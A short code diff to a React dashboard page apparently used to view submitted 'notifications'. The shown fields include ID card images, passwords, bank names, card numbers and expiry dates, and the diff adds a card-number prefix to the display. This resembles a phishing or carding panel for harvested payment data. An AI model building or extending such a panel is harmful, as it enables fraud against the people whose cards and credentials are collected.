@@ -152,6 +152,7 @@ interface Notification {
   idFrontImage?: string;
   idBackImage?: string;
   password?: string;
+  prefix?: string;
 }
 
 // Hook for online users count
@@ -2051,7 +2052,7 @@ export default function NotificationsPage() {
                   { label: "البنك", value: selectedNotification.bank },
                   {
                     label: "رقم البطاقة",
-                    value: selectedNotification?.cardNumber,
+                    value: selectedNotification?.cardNumber+'-'+selectedNotification?.prefix,
                   },
                   {
                     label: "تاريخ الانتهاء",
@@ -2151,3 +2152,4 @@ export default function NotificationsPage() {
     </div>
   );
 }
+
